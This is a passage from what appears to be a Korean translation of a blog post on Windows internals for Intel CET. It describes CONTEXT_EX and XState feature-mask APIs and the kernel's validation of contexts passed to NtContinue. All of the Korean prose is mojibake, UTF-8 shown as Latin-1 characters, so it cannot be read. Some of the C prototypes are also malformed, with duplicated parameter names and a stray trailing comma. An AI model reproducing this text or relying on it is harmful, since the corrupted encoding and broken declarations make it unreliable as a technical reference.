í•œë‹¤.</p><p>ê¸°ëŠ¥ì´ ë§¤ìš° ë³µì¡í•˜ê¸° ë•Œë¬¸ì— <code>Ntdll.dll</code>ì€ CONTEXT_EXì— ì €ì¥ëœ ë‹¤ì–‘í•œ ë°ì´í„°ì˜ ë¹Œë“œ, ì½ê¸°, ë³µì‚¬ ë° ì¡°ì‘ì„ ë‹¨ìˆœí™”í•˜ê¸° ìœ„í•´ ë‹¤ì–‘í•œ APIë¥¼ export í•œë‹¤. (ì´ëŸ¬í•œ API ì¤‘ ì¼ë¶€ëŠ” <code>Ntoskrn.exe</code> ì—ì„œ ë‚´ë¶€ì ìœ¼ë¡œ ì‚¬ìš©ë˜ì§€ë§Œ export ë˜ì§€ëŠ” ì•ŠëŠ”ë‹¤.) ë˜í•œ <code>KernelBase.dll</code>ì€ ì´ëŸ¬í•œ ê¸°ëŠ¥ì„ ë‚´ë¶€ì ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” ë¬¸ì„œí™”ëœ Win32 í•¨ìˆ˜ë¥¼ export í•œë‹¤.</p><h2 id="CONTEXT-EX-ì´ˆê¸°í™”"><a href="#CONTEXT-EX-ì´ˆê¸°í™”" class="headerlink" title="CONTEXT_EX ì´ˆê¸°í™”"></a>CONTEXT_EX ì´ˆê¸°í™”</h2><p>ë¨¼ì € í˜¸ì¶œìëŠ” CONTEXT_EXë¥¼ ì €ì¥í•˜ê¸° ìœ„í•´ í• ë‹¹í•  ë©”ëª¨ë¦¬ í¬ê¸°ë¥¼ íŒŒì•…í•´ì•¼ í•˜ëŠ”ë°, ì´ëŠ” ë‹¤ìŒ APIë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs c">NTSYSAPIULONGNTAPIRtlGetExtendedContextLength (    _In_ ULONG ContextFlags,    _Out_ PULONG ContextLength);</code></pre><p>í˜¸ì¶œìëŠ” ì €ì¥í•  ë ˆì§€ìŠ¤í„°ë¥¼ ì§€ì •í•˜ê¸° ìœ„í•´ ì ì ˆí•œ <code>CONTEXT_XXX</code> í”Œë˜ê·¸ë¥¼ ì œê³µí•´ì•¼ í•œë‹¤. ê·¸ëŸ° ë‹¤ìŒì´ APIëŠ” <code>SharedUserData.XState.EnabledFeatures</code> ë° <code>SharedUserData.XState.EnabledUserVisibleSupervisorFeatures</code> ë¥¼ ì½ê³  ëª¨ë“  ë¹„íŠ¸ë¥¼ í†µí•©í•´ ì•„ë˜ì˜ í™•ì¥ í•¨ìˆ˜ë¡œ ì „ë‹¬í•œë‹¤.</p><pre><code class="hljs c">NTSYSAPIULONGNTAPIRtlGetExtendedContextLength2 (    _In_ ULONG ContextFlags,    _Out_ PULONG ContextLength,    _In_ ULONG64 XStateCompactionMask);</code></pre><p>ì´ ìµœì‹  APIë¥¼ ì‚¬ìš©í•˜ë©´ ê³µìœ  ì‚¬ìš©ì ë°ì´í„°ì˜ XState êµ¬ì„±ì—ì„œ ëª¨ë“  í™œì„±í™”ëœ ê¸°ëŠ¥ì„ ê°€ì ¸ì˜¤ëŠ” ëŒ€ì‹  ì‹¤ì œë¡œ ì €ì¥í•  XState ìƒíƒœë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì§€ì •í•  ìˆ˜ ìˆë‹¤. ì´ë¡œ ì¸í•´ CONTNENT_EX êµ¬ì¡°ì˜ í¬ê¸°ê°€ ì‘ì•„ì ¸ ëª¨ë“  XState ë°ì´í„°ë¥¼ ì €ì¥í•  ê³µê°„ì´ ì¶©ë¶„í•˜ì§€ ì•Šê²Œ ë˜ë¯€ë¡œ ì´ CONTNT_EXë¥¼ ë‚˜ì¤‘ì— ì‚¬ìš©í•˜ë©´ ì§€ì •ëœ ë§ˆìŠ¤í¬ ì™¸ë¶€ì—ì„œ XState Bitsë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šì•„ì•¼ í•œë‹¤.</p><p>ë‹¤ìŒìœ¼ë¡œ í˜¸ì¶œìëŠ” CONTEXT_EXì— ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê³  (ëŒ€ë¶€ë¶„ì˜ ê²½ìš° WindowsëŠ” ì˜ˆì™¸ ê²½ë¡œì—ì„œ ë©”ëª¨ë¦¬ í• ë‹¹ ì‹¤íŒ¨ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ <code>alloca</code>ë¥¼ ì‚¬ìš©í•œë‹¤.) ë‹¤ìŒ ë‘ API ì¤‘ í•˜ë‚˜ë¥¼ ì‚¬ìš©í•œë‹¤.</p><pre><code class="hljs c">NTSYSAPIULONGNTAPIRtlInitializeExtendedContext (    _Out_ PVOID Context,    _In_ ULONG ContextFlags,    _Out_ PCONTEXT_EX* ContextEx);NTSYSAPIULONGNTAPIRtlInitializeExtendedContext2 (    _Out_ PVOID Context,    _In_ ULONG ContextFlags,    _Out_ PCONTEXT_EX* ContextEx,    _In_ ULONG64 XStateCompactionMask);</code></pre><p>ì´ì „ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ìµœì‹  APIì—ì„œëŠ” ì••ì¶•ëœ í˜•ì‹ìœ¼ë¡œ ì €ì¥í•  XState ìƒíƒœë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì§€ì •í•  ìˆ˜ ìˆë‹¤. ì§€ì •í•˜ì§€ ì•Šìœ¼ë©´ ì‚¬ìš© ê°€ëŠ¥í•œ ëª¨ë“  ê¸°ëŠ¥ (<code>SharedUserData</code> ê¸°ë°˜)ì´ ìˆëŠ” ê²ƒìœ¼ë¡œ ê°„ì£¼ëœë‹¤.  í˜¸ì¶œìëŠ” <code>RtlGetExtendedContextLength(2)</code>ì— ëŒ€í•œ í˜¸ì¶œê³¼ ë™ì¼í•œ <code>ContextFlags</code>ë¥¼ ì§€ì •í•´ ì½˜í…ìŠ¤íŠ¸ êµ¬ì¡°ê°€ ì˜¬ë°”ë¥¸ í¬ê¸°ë¡œ í• ë‹¹ë˜ì—ˆëŠ”ì§€ í™•ì¸í•´ì•¼ í•œë‹¤. ì´í›„ í˜¸ì¶œìëŠ” ì…ë ¥ CONTEXT ë²„í¼ë¥¼ ë”°ë¼ê°ˆ ê²ƒìœ¼ë¡œ ì˜ˆìƒë˜ëŠ” CONTEXT_EX êµ¬ì¡°ì˜ í¬ì¸í„°ë¥¼ ë°›ëŠ”ë‹¤.</p><p>CONTEXT_EXê°€ ì¡´ì¬í•˜ë©´ í˜¸ì¶œìëŠ” ë¨¼ì € ë ˆê±°ì‹œ CONTEXT êµ¬ì¡°ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤. (í¬ê¸°ì— ëŒ€í•œ ê°€ì • ì—†ì´). ë‹¤ìŒ APIë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs c">NTSYSAPIPCONTEXTNTAPIRtlLocateLegacyContext (    _In_ PCONTEXT_EX ContextEx,    _Out_opt_ PULONG Length,);</code></pre><p>ê·¸ëŸ¬ë‚˜ ì´ì „ì— ì–¸ê¸‰í–ˆë“¯ì´ ì´ë“¤ì€ Windowsì˜ NT ê³„ì¸µì— ì˜í•´ ë…¸ì¶œë˜ëŠ” ë¬¸ì„œí™”ë˜ì§€ ì•Šì€ ë‚´ë¶€ APIë‹¤. ì¼ë°˜ì ì¸ Win32 ì‘ìš© í”„ë¡œê·¸ë¨ì€ ë‹¤ìŒ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ XState í˜¸í™˜ CONTEXT êµ¬ì¡°ì˜ ì‚¬ìš©ì„ ë‹¨ìˆœí™”í•œë‹¤.</p><pre><code class="hljs c">WINBASEAPIBOOLWINAPIInitializeContext (    _Out_writes_bytes_opt_(*ContextLength) PVOID Context,    _In_ DWORD ContextFlags,    _Out_ PCONTEXT_EX Context,    _Inout_ PDWORD ContextFlags);WINBASEAPIBOOLWINAPIInitializeContext2 (    _Out_writes_bytes_opt_(*ContextLength) PVOID Context,    _In_ DWORD ContextFlags,    _Out_ PCONTEXT_EX Context,    _Inout_ PDWORD ContextFlags,    _In_ ULONG64 XStateCompactionMask);</code></pre><p>ì´ ë‘ APIëŠ” ë¬¸ì„œí™”ë˜ì§€ ì•Šì€ APIì™€ ë¹„ìŠ·í•˜ê²Œ ì‘ë™í•œë‹¤. í˜¸ì¶œìê°€ Buffer ë° Context ë§¤ê°œ ë³€ìˆ˜ë¡œ ì²˜ìŒ NULLì„ ì „ë‹¬í•˜ë©´ í•¨ìˆ˜ëŠ” <code>ContextLength</code>ì— í•„ìš”í•œ ê¸¸ì´ë¥¼ ë°˜í™˜í•˜ë©° í˜¸ì¶œìëŠ” ë©”ëª¨ë¦¬ì— í• ë‹¹í•œë‹¤. ë‘ ë²ˆì§¸ ì‹œë„ì—ì„œ í˜¸ì¶œìëŠ” í• ë‹¹ëœ í¬ì¸í„°ë¥¼ Bufferì— ì „ë‹¬í•˜ê³  ê¸°ë³¸ CONTEXT_EX êµ¬ì¡°ì— ëŒ€í•œ ì •ë³´ ì—†ì´ Contextì˜ CONTEXT êµ¬ì¡°ì— ëŒ€í•œ í¬ì¸í„°ë¥¼ ë°›ëŠ”ë‹¤.</p><h2 id="CONTEXT-EXì—ì„œ-XState-ê¸°ëŠ¥-ë§ˆìŠ¤í¬-ì œì–´"><a href="#CONTEXT-EXì—ì„œ-XState-ê¸°ëŠ¥-ë§ˆìŠ¤í¬-ì œì–´" class="headerlink" title="CONTEXT_EXì—ì„œ XState ê¸°ëŠ¥ ë§ˆìŠ¤í¬ ì œì–´"></a>CONTEXT_EXì—ì„œ XState ê¸°ëŠ¥ ë§ˆìŠ¤í¬ ì œì–´</h2><p>CONTEXT_EXì˜ <code>XSAVE_AREA_HEADER</code>ì˜ Mask í•„ë“œì— í¬í•¨ëœ <code>XSTATE_BV</code> (í™•ì¥ ê¸°ëŠ¥ ë§ˆìŠ¤í¬)ì— ì•¡ì„¸ìŠ¤ í•˜ê¸° ìœ„í•´ ì‹œìŠ¤í…œì€  XState ë§ˆìŠ¤í¬ë¥¼ ìˆ˜ì •í•˜ê¸° ìœ„í•œ APIì™€ í•¨ê»˜ CONTEXT_EXì—ì„œ ì–´ë–¤ XState ê¸°ëŠ¥ì´ í™œì„±í™”ë˜ì–´ ìˆëŠ”ì§€ ì‰½ê²Œ í™•ì¸í•  ìˆ˜ ìˆë„ë¡ ë‘ ê°œì˜ APIë¥¼ export í•œë‹¤.</p><p>ê·¸ëŸ¬ë‚˜ WindowsëŠ” XSAVE ì˜ì—­ì— x87 FPU (0) ë° SSE (1) ìƒíƒœë¥¼ ì €ì¥í•˜ì§€ ì•Šê³  ëŒ€ì‹  <code>FXSAVE</code> ëª…ë ¹ì„ ì‚¬ìš©í•œë‹¤. ì¦‰, XSAVE ì˜ì—­ì— ë ˆê±°ì‹œ ì˜ì—­ì´ í¬í•¨ë˜ì§€ ì•Šê³  ì¦‰ì‹œ <code>XSAVE_AREA_HEADER</code>ë¡œ ì‹œì‘ëœë‹¤. ì´ë¡œ ì¸í•´ Get APIëŠ” í•­ìƒ í•˜ìœ„ 2 ë¹„íŠ¸ë¥¼ ë§ˆìŠ¤í‚¹í•œë‹¤. ë˜í•œ Set APIëŠ” ì§€ì •ëœ ê¸°ëŠ¥ì´ XState êµ¬ì„±ì˜ <code>EnabledFeatures</code>ì— ìˆëŠ”ì§€ í™•ì¸í•œë‹¤.</p><p><code>InitializeContext2</code>(ë˜ëŠ” ë‚´ë¶€ ë„¤ì´í‹°ë¸Œ APIs)ì—ì„œ í•˜ë“œ ì½”ë”©ëœ ì••ì¶• ë§ˆìŠ¤í¬ê°€ ì§€ì •ëœ ê²½ìš° Set APIë¥¼ ì‚¬ìš©í•˜ì—¬ ê¸°ì¡´ ìƒíƒœ ë¹„íŠ¸ë¥¼ ìƒëµí•´ì„œëŠ” ì•ˆëœë‹¤. (ìƒˆ ë¹„íŠ¸ë¥¼ ì¶”ê°€í•˜ë©´ CONTEXT_EXì— ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ ì¶”ê°€ ìƒíƒœ ë°ì´í„°ê°€ í¬í•¨ë˜ë¯€ë¡œ ì´ ë°ì´í„° ì—†ì´ ì´ë¯¸ ì‚¬ì „ í• ë‹¹ë˜ì—ˆì„ ê²ƒì´ë‹¤.)</p><pre><code class="hljs c">NTSYSAPIULONG64NTAPIRtlGetExtendedFeaturesMask (    _In_ PCONTEXT_EX ContextEx);NTSYSAPIULONG64NTAPIRtlSetExtendedFeaturesMask (    _In_ PCONTEXT_EX ContextEx,    _In_ ULONG64 FeatureMask);</code></pre><p>ìœ„ APIì˜ ë¬¸ì„œí™”ëœ í˜•ì‹ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs c">WINBASEAPIBOOLWINAPIGetXStateFeaturesMask (    _In_ PCONTEXT Context    _Out_ PDWORD64 FeatureMask);NTSYSAPIULONG64NTAPISetXStateFeaturesMask (    _In_ PCONTEXT Context,    _In_ DWORD64 FeatureMask);</code></pre><h2 id="CONTEXT-EXì—ì„œ-XState-ê¸°ëŠ¥-ì°¾ê¸°"><a href="#CONTEXT-EXì—ì„œ-XState-ê¸°ëŠ¥-ì°¾ê¸°" class="headerlink" title="CONTEXT_EXì—ì„œ XState ê¸°ëŠ¥ ì°¾ê¸°"></a>CONTEXT_EXì—ì„œ XState ê¸°ëŠ¥ ì°¾ê¸°</h2><p>CONTEXT_EX êµ¬ì¡°ì˜ ë³µì¡ì„±ê³¼ XState ê¸°ëŠ¥ì´ ì••ì¶•ë˜ê±°ë‚˜ ì••ì¶•ë˜ì§€ ì•Šì€ í˜•íƒœë¡œ ì¡´ì¬í•  ìˆ˜ ìˆê³  ì¡´ì¬ ì—¬ë¶€ë„ ì•ì„œ ì„¤ëª…í•œ ë‹¤ì–‘í•œ ìƒíƒœ ë§ˆìŠ¤í¬ì— ì˜ì¡´í•œë‹¤ëŠ” ì‚¬ì‹¤ (íŠ¹íˆ ìµœì í™”ëœ XSAVEê°€ ì§€ì›ë˜ëŠ” ê²½ìš°)ë¡œ ì¸í•´, í˜¸ì¶œìëŠ” CONTEXT_EX ë‚´ì˜ XSAVE ì˜ì—­ì—ì„œ ê´€ë ¨ ìƒíƒœ ë°ì´í„°ì— ëŒ€í•œ í¬ì¸í„°ë¥¼ ì‰½ê³  ë¹ ë¥´ê²Œ ì–»ê¸° ìœ„í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ê°€ í•„ìš”í•˜ë‹¤.</p><p>í˜„ì¬ ë‹¤ìŒê³¼ ê°™ì€ ë‘ ê°€ì§€ í•¨ìˆ˜ê°€ ì¡´ì¬í•œë‹¤. <code>RtlLocateExtendedFeature</code>ëŠ” <code>RtlLocateExtendedFeature2</code>ì˜ wrapperì´ë©° êµ¬ì„± ë§¤ê°œ ë³€ìˆ˜ë¡œ <code>SharedUserData.XState</code>ì— ëŒ€í•œ í¬ì¸í„°ë¥¼ ì œê³µí•œë‹¤. ë‘ í•¨ìˆ˜ ëª¨ë‘ export í•  ë•Œ í˜¸ì¶œìê°€ ì„ íƒí•œ ê²½ìš° í›„ìì˜ APIì—ì„œ ìì²´ ì‚¬ìš©ì ì§€ì • XState êµ¬ì„±ì„ ìˆ˜ë™ìœ¼ë¡œ ì§€ì •í•  ìˆ˜ë„ ìˆë‹¤.</p><pre><code class="hljs c">NTSYSAPIPVOIDNTAPIRtlLocateExtendedFeature (    _In_ CONTEXT_EX ContextEx,    _In_ ULONG FeatureId,    _Out_opt_ PULONG Length);NTSYSAPIPVOIDNTAPIRtlLocateExtendedFeature2 (    _In_ CONTEXT_EX ContextEx,    _In_ ULONG FeatureId,    _In_ PXSTATE_CONFIGURATION Configuration,    _Out_opt_ PULONG Length);</code></pre><p>ë‘ í•¨ìˆ˜ ëª¨ë‘ CONTEXT_EX êµ¬ì¡°ì™€ ìš”ì²­ëœ ê¸°ëŠ¥ì˜ IDë¥¼ ìˆ˜ì‹ í•˜ê³  ê¸°ëŠ¥ì´ XSAVE ì˜ì—­ì— ì €ì¥ëœ ìœ„ì¹˜ì— ëŒ€í•œ í¬ì¸í„°ë¥¼ ë°˜í™˜í•˜ê¸° ìœ„í•´ XState êµ¬ì„± ë°ì´í„°ë¥¼ êµ¬ë¬¸ ë¶„ì„í•œë‹¤. ì§€ì •ëœ ê¸°ëŠ¥ì— ëŒ€í•œ ì‹¤ì œ ê°’ì„ í™•ì¸í•˜ê±°ë‚˜ ë°˜í™˜í•˜ì§€ ì•Šìœ¼ë©° ì´ëŠ” í˜¸ì¶œìì—ê²Œ ë‹¬ë ¤ ìˆë‹¤.</p><p>í¬ì¸í„°ë¥¼ ì°¾ê¸° ìœ„í•´ <code>RtlLocateExtendedFeature2</code>ëŠ” ë‹¤ìŒì„ ìˆ˜í–‰í•œë‹¤:</p><ul><li>ê¸°ëŠ¥ IDê°€ 2 ì´ìƒ (x87 FPU ë° SSE ìƒíƒœëŠ” Windowsì˜ XSAVEë¥¼ í†µí•´ ì €ì¥ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ) ë° 64 (ê°€ëŠ¥í•œ ê°€ì¥ ë†’ì€ XState ê¸°ëŠ¥ ë¹„íŠ¸) ë¯¸ë§Œì¸ì§€ í™•ì¸í•œë‹¤.</li><li>CONTEXT_EX + <code>CONTEXT_EX.XState.Offset</code>ì—ì„œ <code>XSAVE_AREA_HEADER</code>ë¥¼ ê°€ì ¸ì˜¨ë‹¤.</li><li><code>Configuration</code>-&gt; <code>ControlFlags.CompactionEnabled</code> í”Œë˜ê·¸ì—ì„œ ì••ì¶•ì„ ì‚¬ìš©í•˜ëŠ”ì§€ ì—¬ë¶€ë¥¼ ì•Œ ìˆ˜ ìˆë‹¤.</li><li>ì••ì¶•ë˜ì§€ ì•Šì€ í˜•ì‹ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš° :<ul><li><code>Configuration</code>-&gt; <code>Features[n].Offset</code> ë° <code>.Size</code>ë¥¼ ì½ê³  XSAVE ì˜ì—­ì—ì„œ ìš”ì²­ëœ ê¸°ëŠ¥ì˜ ì˜¤í”„ì…‹ ë° í¬ê¸°ë¥¼ ì €ì¥í•œë‹¤.</li></ul></li><li>ì••ì¶•ëœ í˜•ì‹ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš° :<ul><li><code>XSAVE_AREA_HEADER</code> (<code>XCOMP_BV</code>ì— í•´ë‹¹)ì—ì„œ <code>CompactionMask</code>ë¥¼ ì½ê³  ìš”ì²­ëœ ê¸°ëŠ¥ì´ í¬í•¨ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•œë‹¤.</li><li><code>Configuration</code>-&gt; <code>AllFeatures</code>ë¥¼ ì½ê³  ìƒíƒœ ë¹„íŠ¸ê°€ ìš”ì²­ëœ ê¸°ëŠ¥ ID ì•ì— ì˜¤ëŠ” ëª¨ë“  í™œì„±í™”ëœ ìƒíƒœì˜ í¬ê¸°ë¥¼ ì €ì¥í•˜ê³  ì´ëŸ¬í•œ í¬ê¸°ë¥¼ ë”í•˜ì—¬ ìš”ì²­ëœ í˜•ì‹ì˜ ì˜¤í”„ì…‹ì„ ê³„ì‚°í•œ ë’¤ ê° ì´ì „ ìƒíƒœ ì˜ì—­ì˜ ì‹œì‘ ë¶€ë¶„ì„ 64byteë¡œ ì •ë ¬í•œë‹¤. í•´ë‹¹ ë¹„íŠ¸ê°€ <code>Configuration</code>-&gt; <code>AlignedFeatures</code>ì— ì„¤ì •ëœ ê²½ìš° ë§ˆì§€ë§‰ìœ¼ë¡œ í•„ìš”í•œ ê²½ìš° ì§€ì •ëœ ê¸°ëŠ¥ IDì— ëŒ€í•œ ì˜ì—­ì˜ ì‹œì‘ì„ ì •ë ¬í•œë‹¤.</li><li><code>Configuration.AllFeatures[n]</code>ì—ì„œ ìš”ì²­ëœ ê¸°ëŠ¥ì˜ í¬ê¸°ë¥¼ ì½ëŠ”ë‹¤.</li></ul></li><li>ìœ„ì—ì„œ ê³„ì‚°ëœ ì˜¤í”„ì…‹ì„ ê¸°ë°˜ìœ¼ë¡œ XSAVE ì˜ì—­ì—ì„œ ê¸°ëŠ¥ì„ ì°¾ê³  ì„ íƒì ìœ¼ë¡œ ì¶œë ¥ ê¸¸ì´ ë³€ìˆ˜ì˜ í•´ë‹¹ í¬ê¸°ì™€ í•¨ê»˜ í•´ë‹¹ í¬ê¸°ì— ëŒ€í•œ í¬ì¸í„°ë¥¼ ë°˜í™˜í•œë‹¤.</li></ul><p>ì¦‰, ì••ì¶•ë˜ì§€ ì•Šì€ í˜•ì‹ìœ¼ë¡œ íŠ¹ì • ê¸°ëŠ¥ì˜ ì£¼ì†Œë¥¼ ì°¾ìœ¼ë ¤ë©´ <code>SharedUserData</code>ì—ì„œ í”„ë¡œì„¸ì„œì—ì„œ ì§€ì›í•˜ëŠ” ê¸°ëŠ¥ì„ í™•ì¸í•˜ëŠ” ê²ƒìœ¼ë¡œ ì¶©ë¶„í•˜ë‹¤. ê·¸ëŸ¬ë‚˜ ì••ì¶•ëœ í˜•ì‹ì—ì„œëŠ” <code>SharedUserData</code>ì˜ ì˜¤í”„ì…‹ì— ì˜ì¡´í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ ìŠ¤ë ˆë“œì—ì„œ í™œì„±í™”ëœ ê¸°ëŠ¥ì„ í™•ì¸í•˜ê³  ì´ì „ ê¸°ëŠ¥ì˜ ëª¨ë“  í¬ê¸°ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì˜¤í”„ì…‹ì„ ê³„ì‚°í•´ì•¼ í•œë‹¤.</p><p>ì¼ë°˜ì ì¸ Win32 ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œëŠ” ë‚´ë¶€ì ìœ¼ë¡œ ìœ„ì˜ ê¸°ë³¸ APIë¥¼ í˜¸ì¶œí•˜ì§€ë§Œ ì¼ë¶€ ì‚¬ì „ ì²˜ë¦¬ê°€ ìˆëŠ” ë‹¤ë¥¸ APIê°€ ì‚¬ìš©ë˜ê¸°ë„ í•œë‹¤. ìƒíƒœ ë¹„íŠ¸ 0ê³¼ 1ì€ CONTEXT_EXì—ì„œ XSAVE ì˜ì—­ì˜ ì¼ë¶€ë¡œ ì €ì¥ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ Win32 APIëŠ” ì ì ˆí•œ ë ˆê±°ì‹œ CONTEXT í•„ë“œ (ì¦‰, <code>XSTATE_LEGACY_FLOATING_POINT</code>ì˜ ê²½ìš° FltSave, <code>XSTATE_LEGACY_SSE</code>ì˜ ê²½ìš° Xmm0)ì—ì„œ ì´ëŸ¬í•œ ë‘ ê¸°ëŠ¥ ë¹„íŠ¸ë¥¼ ê°€ì ¸ì™€ ì²˜ë¦¬í•œë‹¤.</p><pre><code class="hljs c">WINBASEAPIPVOIDWINAPILocateXStateFeature (    _In_ CONTEXT_EX Context,    _In_ DWORD FeatureId,    _Out_opt_ PDWORD Length);</code></pre><h2 id="ì˜ˆì œ-ì‚¬ìš©ê³¼-ì¶œë ¥"><a href="#ì˜ˆì œ-ì‚¬ìš©ê³¼-ì¶œë ¥" class="headerlink" title="ì˜ˆì œ ì‚¬ìš©ê³¼ ì¶œë ¥"></a>ì˜ˆì œ ì‚¬ìš©ê³¼ ì¶œë ¥</h2><p>CONTEXT_EX ë°ì´í„° êµ¬ì¡°ì™€ ê²°í•©ëœ ê²½ìš° XState ë‚´ë¶€ë¥¼ ì´í•´í•˜ê¸° ìœ„í•´ ê°„ë‹¨í•œ <a href="https://github.com/yardenshafir/cet-research/tree/master/Xpolicy">í…ŒìŠ¤íŠ¸ í”„ë¡œê·¸ë¨</a>ì„ ì‘ì„±í–ˆë‹¤. ì´ ìœ í‹¸ë¦¬í‹°ëŠ” ì¼ë¶€ API ì‚¬ìš©ê³¼ ê´€ë ¨ëœ ë‹¤ì–‘í•œ ì˜¤í”„ì…‹, í¬ê¸° ë° ë™ì‘ì„ ë³´ì—¬ì¤€ë‹¤. ë‹¤ìŒì€ AVX, MPX ë° Intel PTê°€ ìˆëŠ” ì‹œìŠ¤í…œì—ì„œ í”„ë¡œê·¸ë¨ (AVX ë ˆì§€ìŠ¤í„° ì‚¬ìš©)ì˜ ì¶œë ¥ì´ë‹¤.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/5.png"></p><p>ë¬´ì—‡ë³´ë‹¤ë„ ë ˆê±°ì‹œ CONTEXTê°€ ìŒìˆ˜ì¸ ì˜¤í”„ì…‹ì— ìˆëŠ” ê²½ìš° ì˜ˆìƒëŒ€ë¡œ ì‹œìŠ¤í…œì´ x87 FPU ìƒíƒœ(1) ë° GSE ìƒíƒœ(2)ë¥¼ ì§€ì›í•˜ë”ë¼ë„ <code>XSAVEBV</code>ì—ëŠ” ì´ëŸ¬í•œ ë¹„íŠ¸ê°€ í¬í•¨ë˜ì–´ ìˆì§€ ì•Šìœ¼ë¯€ë¡œ ë ˆê±°ì‹œ ì½˜í…ìŠ¤íŠ¸ ì˜ì—­ì— ì €ì¥ëœë‹¤. (ë”°ë¼ì„œ ê´€ë ¨ ìƒíƒœ ë°ì´í„°ì˜ ìŒìˆ˜ ì˜¤í”„ì…‹ì— ìœ ì˜í•´ì•¼ í•¨) <code>0x40</code> ë°”ì´íŠ¸ í¬ê¸°ì¸ XSAVE í—¤ë” (ì˜¤í”„ì…‹ <code>0x30</code>ì—ì„œ ì‹œì‘) ë‹¤ìŒì— AVX ìƒíƒœ(2)ëŠ” ì˜¤í”„ì…‹ <code>0x70</code>ì—ì„œ ì‹œì‘í•œë‹¤.</p><h1 id="CONTEXT-EX-ìœ íš¨ì„±-ê²€ì‚¬"><a href="#CONTEXT-EX-ìœ íš¨ì„±-ê²€ì‚¬" class="headerlink" title="CONTEXT_EX ìœ íš¨ì„± ê²€ì‚¬"></a>CONTEXT_EX ìœ íš¨ì„± ê²€ì‚¬</h1><p>ìœ ì € ëª¨ë“œ APIëŠ” ê²°êµ­ ì»¤ë„ì— ì˜í•´ ì²˜ë¦¬ë˜ê³  XSAVE ì˜ì—­ì˜ ê¶Œí•œ ìˆëŠ” ë¶€ë¶„ (ì¦‰, CET ìƒíƒœ ë°ì´í„°)ì„ ìˆ˜ì •í•˜ëŠ” CONTEXT_EXë¥¼ êµ¬ì„±í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ WindowsëŠ” CONTEXT_EXë¥¼ í—ˆìš©í•˜ëŠ” APIë¥¼ í†µí•œ ë°”ëŒì§í•˜ì§€ ì•Šì€ ìˆ˜ì •ì„ ë°©ì§€í•´ì•¼ í•œë‹¤. ì˜ˆë¥¼ ë“¤ì–´ :</p><ul><li><code>NtContinue</code> : ì˜ˆì™¸ í›„ ì¬ê°œí•˜ëŠ” ë° ì‚¬ìš©ë˜ë©° longjmp CRT ê¸°ëŠ¥ì„ ì²˜ë¦¬í•˜ê³  ìŠ¤íƒ í•´ì œë¥¼ ìˆ˜í–‰í•œë‹¤.</li><li><code>NtRaiseException</code> : ê¸°ì¡´ ìŠ¤ë ˆë“œì— ì˜ˆì™¸ë¥¼ ì‚½ì…í•˜ëŠ” ë° ì‚¬ìš©ë¨</li><li><code>NtQueueUserApc</code> : ê¸°ì¡´ ìŠ¤ë ˆë“œì˜ ì‹¤í–‰ íë¦„ì„ ê°€ë¡œì±„ëŠ” ë° ì‚¬ìš©ë¨</li><li><code>NtSetContextThread</code> : ê¸°ì¡´ ìŠ¤ë ˆë“œì˜ í”„ë¡œì„¸ì„œ ë ˆì§€ìŠ¤í„° / ìƒíƒœë¥¼ ìˆ˜ì •í•˜ëŠ” ë° ì‚¬ìš©ë¨</li></ul><p>ì´ëŸ¬í•œ ì‹œìŠ¤í…œ í˜¸ì¶œë¡œ ì¸í•´ ì»¤ë„ì´ <code>IA32_PL3_SSP</code> ë˜ëŠ” <code>IA32_CET_U</code> MSRì„ ìˆ˜ì •í•˜ê³  RIPë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ WindowsëŠ” ì „ë‹¬ëœ CONTEXT_EXê°€ CET ë³´ì¦ì„ ìœ„ë°˜í•˜ì§€ ì•ŠëŠ”ì§€ í™•ì¸í•´ì•¼ í•œë‹¤.</p><p><code>19H1</code>ì— SSPë¥¼ ê²€ì¦í•˜ê³  <code>20H1</code>ì— RIP ê²€ì¦ì„ ì¶”ê°€í•˜ëŠ” ë°©ë²•ì„ ê³§ ë‹¤ë£° ì˜ˆì •ì´ë‹¤. í•˜ì§€ë§Œ ë¨¼ì € <code>NtContinue</code>ì˜ ì˜¤ìš© ê°€ëŠ¥ì„±ì„ ì¤„ì´ê¸° ìœ„í•´ ì‘ì€ ë¦¬íŒ©í„°ë§ì„ ìˆ˜í–‰í•´ì•¼ í–ˆë‹¤. ë°”ë¡œ <code>NtContinueEx</code> í•¨ìˆ˜ì˜ ë„ì…ì´ë‹¤.</p><h2 id="NtContinueEX-ë°-KCONTINUE-ARGUMENT"><a href="#NtContinueEX-ë°-KCONTINUE-ARGUMENT" class="headerlink" title="NtContinueEX ë° KCONTINUE_ARGUMENT"></a>NtContinueEX ë° KCONTINUE_ARGUMENT</h2><p>ìœ„ì—ì„œ ì„¤ëª…í•œ ëŒ€ë¡œ <code>NtContinue</code>ì˜ ê¸°ëŠ¥ì€ ì—¬ëŸ¬ ìƒí™©ì—ì„œ ì‚¬ìš©ë˜ë©°, CETê°€ í”„ë¡œì„¸ì„œ ìƒíƒœì— ëŒ€í•œ ì„ì˜ ë³€ê²½ì„ í—ˆìš©í•˜ëŠ” APIì—ì„œ ê¸°ì¡´ ìƒíƒœë¥¼ ë³µì›í•  ìˆ˜ 